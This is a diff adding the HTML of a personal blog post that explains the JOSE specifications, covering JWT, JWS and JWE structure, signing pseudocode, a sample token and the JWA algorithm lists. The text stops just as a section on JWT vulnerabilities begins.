@@ -1,0 +1,1056 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    
+      <title>
+        JOSE ::
+        Your site title
+      </title>
+    
+    <meta http-equiv="content-type" content="text/html; charset=utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<meta
+  name="description"
+  content="What is JOSE? # JOSE (JavaScript Object Signing &amp;amp; Encryption) is collection of specifications that consist of following components :
+JWT - JSON Wev Token standard - is JSON hash ( base64url encoding ) with claims, that is signed by JWS or encrypted by JWE, and serialized.
+JWS JSON Web Signature - defines how to handle signed claims
+JWE JSON Web Encryption - defines how to encryption/decryption of claims"
+/>
+<meta
+  name="keywords"
+  content=""
+/>
+<meta name="robots" content="noodp" />
+<link rel="canonical" href="http://ladybuginthemug.github.io/writings/jose/" />
+
+
+
+
+
+
+
+<link rel="stylesheet" href="/css/style.css" />
+
+<link rel="stylesheet" href="http://ladybuginthemug.github.io/style.css" />
+
+
+<link rel="apple-touch-icon-precomposed" sizes="144x144" href="http://ladybuginthemug.github.io/img/apple-touch-icon-144-precomposed.png" />
+<link rel="shortcut icon" href="http://ladybuginthemug.github.io/img/favicon.png" />
+
+
+<link href="/fonts/Inter-Italic.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
+<link href="/fonts/Inter-Regular.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
+<link href="/fonts/Inter-Medium.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
+<link href="/fonts/Inter-MediumItalic.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
+<link href="/fonts/Inter-Bold.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
+<link href="/fonts/Inter-BoldItalic.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
+
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="JOSE"/>
+<meta name="twitter:description" content="JWT vulnerabilities"/>
+
+
+
+<meta property="og:title" content="JOSE" />
+<meta property="og:description" content="JWT vulnerabilities" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="http://ladybuginthemug.github.io/writings/jose/" /><meta property="article:section" content="writings" />
+
+<meta property="og:site_name" content="Your site title" />
+
+
+
+
+
+
+  </head>
+  <body >
+    <div class="container">
+      <header class="header">
+  <span class="header__inner">
+    <a
+  href="/"
+  class="logo"
+  style="text-decoration: none;"
+>
+  
+    <span class="logo__mark"><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" viewBox="0 0 44 44">
+  <path fill="none" d="M15 8l14.729 14.382L15 35.367" />
+</svg>
+</span>
+    <span class="logo__text"
+      >pushingbuttons</span
+    >
+    <span class="logo__cursor"></span>
+  
+</a>
+
+    <span class="header__right">
+      
+        <nav class="menu">
+  <ul class="menu__inner menu__inner--desktop">
+    
+      
+        
+          <li><a href="/writings/">writings</a></li>
+        
+      
+        
+          <li><a href="/projects/">projects</a></li>
+        
+      
+        
+          <li><a href="/categories/">categories</a></li>
+        
+      
+        
+          <li><a href="https://github.com/ladybuginthemug">git</a></li>
+        
+      
+    
+  </ul>
+
+  <ul class="menu__inner menu__inner--mobile">
+    
+      
+        <li><a href="/writings/">writings</a></li>
+      
+    
+      
+        <li><a href="/projects/">projects</a></li>
+      
+    
+      
+        <li><a href="/categories/">categories</a></li>
+      
+    
+      
+        <li><a href="https://github.com/ladybuginthemug">git</a></li>
+      
+    
+  </ul>
+</nav>
+
+        <span class="menu-trigger">
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+            <path d="M0 0h24v24H0z" fill="none" />
+            <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z" />
+          </svg>
+        </span>
+      
+      <span class="theme-toggle">
+        <svg
+  class="theme-toggler"
+  width="24"
+  height="24"
+  viewBox="0 0 48 48"
+  fill="none"
+  xmlns="http://www.w3.org/2000/svg"
+>
+  <path
+    d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
+  3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
+  13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"
+  />
+</svg>
+
+      </span>
+    </span>
+  </span>
+</header>
+
+
+      <div class="content">
+        
+  
+  
+
+  <article class="post">
+    <h1 class="post-title">JOSE</h1>
+    <div class="post-meta">
+      
+
+      
+        <span class="post-author"
+          >— by ladybuginthemug</span
+        >
+
+
+      
+        <span class="post-read-time"
+          >— 16 min read</span
+        >
+      
+    </div>
+
+    
+
+    
+
+    <div class="post-content">
+      
+      <h3 id="what-is-jose">
+  What is JOSE?
+  <a href="#what-is-jose" class="h-anchor" aria-hidden="true">#</a>
+</h3>
+<p><a href="https://datatracker.ietf.org/doc/html/rfc7165"><code>JOSE</code></a> (JavaScript Object Signing &amp; Encryption)  is collection of specifications that consist of  following components :</p>
+<ul>
+<li>
+<p><a href="https://datatracker.ietf.org/doc/html/rfc7519"><code>JWT</code></a>  - JSON Wev Token standard - is <a href="https://www.json.org/json-en.html">JSON</a> hash ( base64url encoding ) with <code>claims</code>, that is signed by <code>JWS</code> or encrypted by  <code>JWE</code>, and serialized.</p>
+</li>
+<li>
+<p><a href="https://datatracker.ietf.org/doc/html/rfc7515"><code>JWS</code></a> JSON Web Signature -  defines how to handle signed claims</p>
+</li>
+<li>
+<p><a href="https://datatracker.ietf.org/doc/html/rfc7516"><code>JWE</code></a> JSON Web Encryption  - defines how to  encryption/decryption of claims</p>
+</li>
+</ul>
+<h3 id="why-and-where-it-is-used">
+  Why and where it is used?
+  <a href="#why-and-where-it-is-used" class="h-anchor" aria-hidden="true">#</a>
+</h3>
+<p>Once the user is logged in, each subsequent request will include the JWT, with small overhead allowing the user to access routes, services, and resources that are permitted with that token. ( Like a ID badge + fob keys)</p>
+<p>Here are some scenarios where JSON Web Tokens are useful:</p>
+<ul>
+<li>developers usually use JWT to avoid server-side storage for sessions</li>
+<li>authentication,  access control mechanisms</li>
+</ul>
+<p>For example : SSO ( Single Sign-ON)</p>
+<hr>
+<h3 id="how-">
+  How ?
+  <a href="#how-" class="h-anchor" aria-hidden="true">#</a>
+</h3>
+<p>First. I want  to start with straighten things up between JWT, JWS, JWE. What is what? Where JWT ends and JWS begins? Is it all the same ?</p>
+<hr>
+<h4 id="jwt-vs-jws">
+  JWT vs JWS
+  <a href="#jwt-vs-jws" class="h-anchor" aria-hidden="true">#</a>
+</h4>
+<hr>
+<h5 id="jwt">
+  JWT
+  <a href="#jwt" class="h-anchor" aria-hidden="true">#</a>
+</h5>
+<p>Due to compact serialization <code>JWT</code> has two parts:  a <code>header</code>, a <code>payload</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>JWT <span style="color:#f92672">=</span> Base64Url<span style="color:#f92672">(</span>header<span style="color:#f92672">)</span> + <span style="color:#e6db74">&#39;.&#39;</span> + Base64Url<span style="color:#f92672">(</span>payload<span style="color:#f92672">)</span>
+</span></span></code></pre></div><p>All JWTs consist of is a header and payload, which are JSON objects.  It is not signed and not encrypted.</p>
+<hr>
+<h5 id="jws">
+  JWS
+  <a href="#jws" class="h-anchor" aria-hidden="true">#</a>
+</h5>
+<p><code>JWS </code>has three parts:  a <code>header</code>, a <code>payload</code>, and a <code>signature</code>. ( hence the name )</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>secret <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;your_secret&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># it takes header and payload cuncantened with &#39;.&#39;</span>
+</span></span><span style="display:flex;"><span>data <span style="color:#f92672">=</span> Base64Url<span style="color:#f92672">(</span>header<span style="color:#f92672">)</span> + “.” + Base64Url<span style="color:#f92672">(</span>payload<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># then data is hashed together with a secret</span>
+</span></span><span style="display:flex;"><span>hashedData <span style="color:#f92672">=</span> hash<span style="color:#f92672">(</span> data, secret <span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># final result is encoded</span>
+</span></span><span style="display:flex;"><span>signature <span style="color:#f92672">=</span> Base64Url<span style="color:#f92672">(</span> hashedData <span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>JWS <span style="color:#f92672">=</span> Base64Url<span style="color:#f92672">(</span>header<span style="color:#f92672">)</span> + <span style="color:#e6db74">&#39;.&#39;</span> + Base64Url<span style="color:#f92672">(</span>payload<span style="color:#f92672">)</span> + <span style="color:#e6db74">&#39;.&#39;</span> + Base64Url<span style="color:#f92672">(</span>signature<span style="color:#f92672">)</span>
+</span></span></code></pre></div><p>These objects are also Base64-encoded. The encoded header and payload are combined with a digital signature
+, and all three components are concatenated with period. So when someone talking about <code>JWT</code> they probably meaning <code>JWS</code>.</p>
+<p>You can spot <code>JWT aka JWS</code> in a bearer token header. It will look something like that :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>Authorization: Bearer 
+</span></span><span style="display:flex;"><span>eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9<span style="color:#f92672">.</span>eyJmbGFnIjoibGFkeWJ1ZyIsIm5hbWUiOiJpbnRoZW11ZyIsImFkbWluIjp0cnVlfQ<span style="color:#f92672">.</span>sDHxelxtDr76W6_XI5uxc5_fInmMEekuP4tNfCsgVQY
+</span></span></code></pre></div><hr>
+<p><strong>[1] Header :</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>header <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.&#34;</span>
+</span></span></code></pre></div><p><code>JWS</code> header contains an <code>alg</code> parameter. This tells the server which algorithm was used to sign the token and, therefore, which algorithm it needs to use when verifying the signature.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>decoded_header <span style="color:#f92672">=</span> 
+</span></span><span style="display:flex;"><span><span style="color:#f92672">{</span> 
+</span></span><span style="display:flex;"><span>		<span style="color:#e6db74">&#34;alg&#34;</span>:<span style="color:#e6db74">&#34;HS256&#34;</span>, <span style="color:#75715e">#  HMAC SHA-256 algorithm</span>
+</span></span><span style="display:flex;"><span>		<span style="color:#e6db74">&#34;typ&#34;</span>:<span style="color:#e6db74">&#34;JWT&#34;</span>  <span style="color:#75715e"># JSON Web Token  </span>
+</span></span><span style="display:flex;"><span>		
+</span></span><span style="display:flex;"><span><span style="color:#f92672">}</span>  
+</span></span></code></pre></div><hr>
+<p><strong>[2] Payload :</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;eyJmbGFnIjoibGFkeWJ1ZyIsIm5hbWUiOiJpbnRoZW11ZyIsImFkbWluIjp0cnVlfQ&#34;</span>
+</span></span></code></pre></div><p>This part contains the actual data encoded in the token. Each assertion is called a <code>claim</code>, the developers can add customized claims as they need ( with the exceptions of already registered  claims ), it could include claims like user information, flags, admin rules etc.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>decoded_payload <span style="color:#f92672">=</span> 
+</span></span><span style="display:flex;"><span><span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#e6db74">&#34;flag&#34;</span>: <span style="color:#e6db74">&#34;ladybug&#34;</span>,
+</span></span><span style="display:flex;"><span>  <span style="color:#e6db74">&#34;name&#34;</span>: <span style="color:#e6db74">&#34;inthemug&#34;</span>,
+</span></span><span style="display:flex;"><span>  <span style="color:#e6db74">&#34;admin&#34;</span>: true
+</span></span><span style="display:flex;"><span><span style="color:#f92672">}</span>
+</span></span></code></pre></div><hr>
+<p><strong>[3] Signature :</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>signature <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;sDHxelxtDr76W6_XI5uxc5_fInmMEekuP4tNfCsgVQY&#34;</span>
+</span></span></code></pre></div><p>The signature is used to verify the integrity of the token and ensure that it hasn&rsquo;t been tampered with.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>key <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;your_secret_key&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>JWT <span style="color:#f92672">=</span> Base64Url<span style="color:#f92672">(</span>header<span style="color:#f92672">)</span> + <span style="color:#e6db74">&#39;.&#39;</span> + Base64Url<span style="color:#f92672">(</span>payload<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>signature <span style="color:#f92672">=</span> HMAC-SHA256<span style="color:#f92672">(</span>key, JWT<span style="color:#f92672">)</span>
+</span></span></code></pre></div><hr>
+<hr>
+<h3 id="but-what-about-jwe-">
+  But what about JWE ?
+  <a href="#but-what-about-jwe-" class="h-anchor" aria-hidden="true">#</a>
+</h3>
+<p>JWE does not provide the same guarantees as JWS and, therefore, does not replace the role of JWS in a token exchange. JWS and JWE are complementary when public/private key schemes are being used. (this scheme is known as public-key encryption (PKI), were the public key is the encryption key and the private key is the decryption key).</p>
+<table>
+<thead>
+<tr>
+<th></th>
+<th>private key</th>
+<th>public key</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>JWS</td>
+<td>sign and verify</td>
+<td>only verify</td>
+</tr>
+<tr>
+<td>JWE</td>
+<td>decrypt and encrypt</td>
+<td>only encrypt</td>
+</tr>
+</tbody>
+</table>
+<p><code>JWS</code> are signed JSON data that are comprised of <strong>three parts</strong>, while <code>JWE</code>s are encrypted JSON data and made up of <strong>five parts</strong>:</p>
+<pre tabindex="0"><code>[1]BASE64URL(UTF8( Protected Header) + &#39;.&#39; +
+[2]BASE64URL(Encrypted Key(CEK)) + &#39;.&#39; +
+[3]BASE64URL(JWE Initialization Vector(IV)) + &#39;.&#39; + 
+[4]BASE64URL(JWE Ciphertext) + &#39;.&#39; +
+[5] BASE64URL(JWE Authentication Tag)
+</code></pre><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;protected&#34;</span>: <span style="color:#e6db74">&#34;&lt;integrity-protected header contents&gt;&#34;</span>,
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;unprotected&#34;</span>: <span style="color:#960050;background-color:#1e0010">&lt;non-integrity-protected</span> <span style="color:#960050;background-color:#1e0010">header</span> <span style="color:#960050;background-color:#1e0010">contents&gt;</span>,
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;recipients&#34;</span>: [
+</span></span><span style="display:flex;"><span>    {<span style="color:#f92672">&#34;header&#34;</span>: <span style="color:#960050;background-color:#1e0010">&lt;per-recipient</span> <span style="color:#960050;background-color:#1e0010">unprotected</span> <span style="color:#960050;background-color:#1e0010">header</span> <span style="color:#ae81ff">1</span> <span style="color:#960050;background-color:#1e0010">contents&gt;</span>,
+</span></span><span style="display:flex;"><span>     <span style="color:#f92672">&#34;encrypted_key&#34;</span>: <span style="color:#e6db74">&#34;&lt;encrypted key 1 contents&gt;&#34;</span>},
+</span></span><span style="display:flex;"><span>     <span style="color:#960050;background-color:#1e0010">...</span>
+</span></span><span style="display:flex;"><span>    {<span style="color:#f92672">&#34;header&#34;</span>: <span style="color:#960050;background-color:#1e0010">&lt;per-recipient</span> <span style="color:#960050;background-color:#1e0010">unprotected</span> <span style="color:#960050;background-color:#1e0010">header</span> <span style="color:#960050;background-color:#1e0010">N</span> <span style="color:#960050;background-color:#1e0010">contents&gt;</span>,
+</span></span><span style="display:flex;"><span>     <span style="color:#f92672">&#34;encrypted_key&#34;</span>: <span style="color:#e6db74">&#34;&lt;encrypted key N contents&gt;&#34;</span>}],
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;aad&#34;</span>:<span style="color:#e6db74">&#34;&lt;additional authenticated data contents&gt;&#34;</span>,
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;iv&#34;</span>:<span style="color:#e6db74">&#34;&lt;initialization vector contents&gt;&#34;</span>,
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;ciphertext&#34;</span>:<span style="color:#e6db74">&#34;&lt;ciphertext contents&gt;&#34;</span>,
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;tag&#34;</span>:<span style="color:#e6db74">&#34;&lt;authentication tag contents&gt;&#34;</span>
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-JSON" data-lang="JSON"><span style="display:flex;"><span>{<span style="color:#960050;background-color:#1e0010">&#39;protected&#39;:</span> <span style="color:#960050;background-color:#1e0010">&#39;eyJhbGciOiAiUlNBLU9BRVAiLCAiZW5jIjogIkEyNTZHQ00ifQ==&#39;,</span> 
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">&#39;unprotected&#39;:</span> <span style="color:#960050;background-color:#1e0010">{&#39;kid&#39;:</span> <span style="color:#960050;background-color:#1e0010">&#39;12345&#39;</span>}<span style="color:#960050;background-color:#1e0010">,</span> 
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">&#39;recipients&#39;:</span> [{
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">&#39;header&#39;:</span> <span style="color:#960050;background-color:#1e0010">{&#39;alg&#39;:</span> <span style="color:#960050;background-color:#1e0010">&#39;RSA-OAEP&#39;</span>}, 
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">&#39;encrypted_key&#39;:</span> <span style="color:#960050;background-color:#1e0010">&#39;K_wBW</span><span style="color:#ae81ff">14</span><span style="color:#960050;background-color:#1e0010">TwhcvOvRKnCh</span><span style="color:#ae81ff">95</span><span style="color:#960050;background-color:#1e0010">vk</span><span style="color:#ae81ff">0</span><span style="color:#960050;background-color:#1e0010">h</span><span style="color:#ae81ff">942</span><span style="color:#960050;background-color:#1e0010">SRondffpK-_pc_NNa</span><span style="color:#ae81ff">6</span><span style="color:#960050;background-color:#1e0010">TmFbAB</span><span style="color:#ae81ff">6</span><span style="color:#960050;background-color:#1e0010">_GmnD</span><span style="color:#ae81ff">0</span><span style="color:#960050;background-color:#1e0010">x_XlS</span><span style="color:#ae81ff">7</span><span style="color:#960050;background-color:#1e0010">KBy</span><span style="color:#ae81ff">4</span><span style="color:#960050;background-color:#1e0010">NJIIh</span><span style="color:#ae81ff">6</span><span style="color:#960050;background-color:#1e0010">QBdRs</span><span style="color:#ae81ff">1</span><span style="color:#960050;background-color:#1e0010">bU</span><span style="color:#ae81ff">3</span><span style="color:#960050;background-color:#1e0010">IEYv-Rvsqznxid</span><span style="color:#ae81ff">4</span><span style="color:#960050;background-color:#1e0010">f</span><span style="color:#ae81ff">9</span><span style="color:#960050;background-color:#1e0010">kEEN</span><span style="color:#ae81ff">4</span><span style="color:#960050;background-color:#1e0010">S</span><span style="color:#ae81ff">2</span><span style="color:#960050;background-color:#1e0010">GfiVabPp</span><span style="color:#ae81ff">9</span><span style="color:#960050;background-color:#1e0010">UIt</span><span style="color:#ae81ff">9</span><span style="color:#960050;background-color:#1e0010">vqAfZIlIusTssK</span><span style="color:#ae81ff">65</span><span style="color:#960050;background-color:#1e0010">cgcJPCt_Sia</span><span style="color:#ae81ff">4</span><span style="color:#960050;background-color:#1e0010">saKVAlbTFSEJFYc</span><span style="color:#ae81ff">4</span><span style="color:#960050;background-color:#1e0010">McNKg</span><span style="color:#ae81ff">1</span><span style="color:#960050;background-color:#1e0010">dR</span><span style="color:#ae81ff">1</span><span style="color:#960050;background-color:#1e0010">BUYaKRm</span><span style="color:#ae81ff">6</span><span style="color:#960050;background-color:#1e0010">OoJnKohWAv</span><span style="color:#ae81ff">4</span><span style="color:#960050;background-color:#1e0010">ZeCCYcubeeaDEZvFw_l</span><span style="color:#ae81ff">3</span><span style="color:#960050;background-color:#1e0010">J</span><span style="color:#ae81ff">0</span><span style="color:#960050;background-color:#1e0010">sJLztUTIW_NEtTDx</span><span style="color:#ae81ff">4</span><span style="color:#960050;background-color:#1e0010">gMW</span><span style="color:#ae81ff">0</span><span style="color:#960050;background-color:#1e0010">Cvd</span><span style="color:#ae81ff">1</span><span style="color:#960050;background-color:#1e0010">igWozi</span><span style="color:#ae81ff">2</span><span style="color:#960050;background-color:#1e0010">cEzqKRd_EmDfalf_uh</span><span style="color:#ae81ff">5</span><span style="color:#960050;background-color:#1e0010">Czm</span><span style="color:#ae81ff">386</span><span style="color:#960050;background-color:#1e0010">JZ</span><span style="color:#ae81ff">44</span><span style="color:#960050;background-color:#1e0010">FF</span><span style="color:#ae81ff">4</span><span style="color:#960050;background-color:#1e0010">tX</span><span style="color:#ae81ff">929</span><span style="color:#960050;background-color:#1e0010">YowHz</span><span style="color:#ae81ff">2</span><span style="color:#960050;background-color:#1e0010">Wk</span><span style="color:#ae81ff">7</span><span style="color:#960050;background-color:#1e0010">iCz</span><span style="color:#ae81ff">6</span><span style="color:#960050;background-color:#1e0010">tqzMFE</span><span style="color:#ae81ff">128</span><span style="color:#960050;background-color:#1e0010">fpLve-n</span><span style="color:#ae81ff">112</span><span style="color:#960050;background-color:#1e0010">nAcAlBWNolhf</span><span style="color:#ae81ff">390</span><span style="color:#960050;background-color:#1e0010">syIqHVkaPtM</span><span style="color:#ae81ff">3</span><span style="color:#960050;background-color:#1e0010">dUAh</span><span style="color:#ae81ff">0</span><span style="color:#960050;background-color:#1e0010">tZ</span><span style="color:#ae81ff">9</span><span style="color:#960050;background-color:#1e0010">yCvKAdkLQvOuSmtlW</span><span style="color:#ae81ff">8</span><span style="color:#960050;background-color:#1e0010">_</span><span style="color:#ae81ff">2</span><span style="color:#960050;background-color:#1e0010">u</span><span style="color:#ae81ff">1</span><span style="color:#960050;background-color:#1e0010">n</span><span style="color:#ae81ff">7</span><span style="color:#960050;background-color:#1e0010">jC</span><span style="color:#ae81ff">4</span><span style="color:#960050;background-color:#1e0010">X</span><span style="color:#ae81ff">107</span><span style="color:#960050;background-color:#1e0010">O_ffim</span><span style="color:#ae81ff">63</span><span style="color:#960050;background-color:#1e0010">ILLT</span><span style="color:#ae81ff">8</span><span style="color:#960050;background-color:#1e0010">ksLVHTW</span><span style="color:#ae81ff">6</span><span style="color:#960050;background-color:#1e0010">VHyYbf</span><span style="color:#ae81ff">89</span><span style="color:#960050;background-color:#1e0010">rhXf</span><span style="color:#ae81ff">0</span><span style="color:#960050;background-color:#1e0010">Olzp</span><span style="color:#ae81ff">3</span><span style="color:#960050;background-color:#1e0010">Qvyhj</span><span style="color:#ae81ff">49</span><span style="color:#960050;background-color:#1e0010">qAVIYMpE</span><span style="color:#ae81ff">09</span><span style="color:#960050;background-color:#1e0010">RodkryKCZhPHxECOQQIcbGClwMPcob</span><span style="color:#ae81ff">3</span><span style="color:#960050;background-color:#1e0010">lGwrjAYLes</span><span style="color:#ae81ff">5</span><span style="color:#960050;background-color:#1e0010">VyodilT</span><span style="color:#ae81ff">0</span><span style="color:#960050;background-color:#1e0010">pgRNarhf</span><span style="color:#ae81ff">821</span><span style="color:#960050;background-color:#1e0010">wXgGZBOht_ii&#39;}</span>]<span style="color:#960050;background-color:#1e0010">,</span>
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">&#39;aad&#39;:</span> <span style="color:#960050;background-color:#1e0010">&#39;QWRkaXRpb</span><span style="color:#ae81ff">25</span><span style="color:#960050;background-color:#1e0010">hbCBBdXRoZW</span><span style="color:#ae81ff">50</span><span style="color:#960050;background-color:#1e0010">aWNhdGVkIERhdGE=&#39;,</span> 
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">&#39;iv&#39;:</span> <span style="color:#960050;background-color:#1e0010">&#39;CCiXnNa</span><span style="color:#ae81ff">87</span><span style="color:#960050;background-color:#1e0010">DIaHrNZ&#39;,</span> 
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">&#39;ciphertext&#39;:</span> <span style="color:#960050;background-color:#1e0010">&#39;AdTyQEqOWYxuRnoxa</span><span style="color:#ae81ff">4</span><span style="color:#960050;background-color:#1e0010">dwGdeVk-PwiGN</span><span style="color:#ae81ff">5</span><span style="color:#960050;background-color:#1e0010">i-EpeVtTLFKKGGowJv_Hbw==&#39;,</span> 
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">&#39;tag&#39;:</span> <span style="color:#960050;background-color:#1e0010">&#39;CjpKjbUZp</span><span style="color:#ae81ff">29</span><span style="color:#960050;background-color:#1e0010">ZQXkwtURkmw==&#39;}</span>
+</span></span></code></pre></div><h4 id="jwa">
+  JWA
+  <a href="#jwa" class="h-anchor" aria-hidden="true">#</a>
+</h4>
+<p>The encryption algorithms permitted by JWE are spelled out in <a href="https://tools.ietf.org/html/rfc7518#page-2">RFC 7518</a>, which comes in two sections:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># key encryption </span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;alg&#34;</span> <span style="color:#66d9ef">for</span> JWS: 
+</span></span><span style="display:flex;"><span>    HS256, HS384, HS512 <span style="color:#f92672">(</span>HMAC with SHA<span style="color:#f92672">)</span>, 
+</span></span><span style="display:flex;"><span>    RS256, RS384, RS512 <span style="color:#f92672">(</span>RSASSA-PKCS-v1_5 with SHA<span style="color:#f92672">)</span>, 
+</span></span><span style="display:flex;"><span>    ES256, ES384, ES512 <span style="color:#f92672">(</span>ECDSA with SHA<span style="color:#f92672">)</span>, 
+</span></span><span style="display:flex;"><span>    PS256, PS384, PS512 <span style="color:#f92672">(</span>RSASSA-PSS with SHA <span style="color:#66d9ef">for</span> digest and MGF1<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;alg&#34;</span> <span style="color:#66d9ef">for</span> JWE: 
+</span></span><span style="display:flex;"><span>    RSA1_5, RSA-OAEP, RSA-OAEP-256,  
+</span></span><span style="display:flex;"><span>    A128KW, A192KW, A256KW <span style="color:#f92672">(</span>AES Keywrap<span style="color:#f92672">)</span>, 
+</span></span><span style="display:flex;"><span>    dir <span style="color:#f92672">(</span>direct encryption<span style="color:#f92672">)</span>, 
+</span></span><span style="display:flex;"><span>    ECDH-ES <span style="color:#f92672">(</span>EC Diffie Hellman Ephemeral+Static key agreement<span style="color:#f92672">)</span>, 
+</span></span><span style="display:flex;"><span>    ECDH-ES+A128KW, ECDH-ES+A192KW, ECDH-ES+A256KW <span style="color:#f92672">(</span>with AES Keywrap<span style="color:#f92672">)</span>, 
+</span></span><span style="display:flex;"><span>    A128GCMKW, A192GCMKW, A256GCMKW <span style="color:#f92672">(</span>AES in GCM Keywrap<span style="color:#f92672">)</span>, 
+</span></span><span style="display:flex;"><span>    PBES2-HS256+A128KW, PBES2-HS384+A192KW, PBES2-HS512+A256KW 
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">(</span>PBES2 with HMAC SHA and AES keywrap<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># message encryption</span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;enc&#34;</span> <span style="color:#66d9ef">for</span> JWE: 
+</span></span><span style="display:flex;"><span>    A128CBC-HS256, A192CBC-HS384, A256CBC-HS512 <span style="color:#f92672">(</span>AES in CBC with HMAC<span style="color:#f92672">)</span>, 
+</span></span><span style="display:flex;"><span>    A128GCM, A192GCM, A256GCM <span style="color:#f92672">(</span> AES in GCM <span style="color:#f92672">)</span>
+</span></span></code></pre></div><hr>
+<h2 id="vulnerabilities">
+  Vulnerabilities
+  <a href="#vulnerabilities" class="h-anchor" aria-hidden="true">#</a>
+</h2>
+<p>Like any technology, if you do installment and configuration without a guide or expertise you can do more harm than benefits.</p>
+<ul>
+<li>JWS - Weak signatures and insufficient signature validation:
+<ul>
+<li>
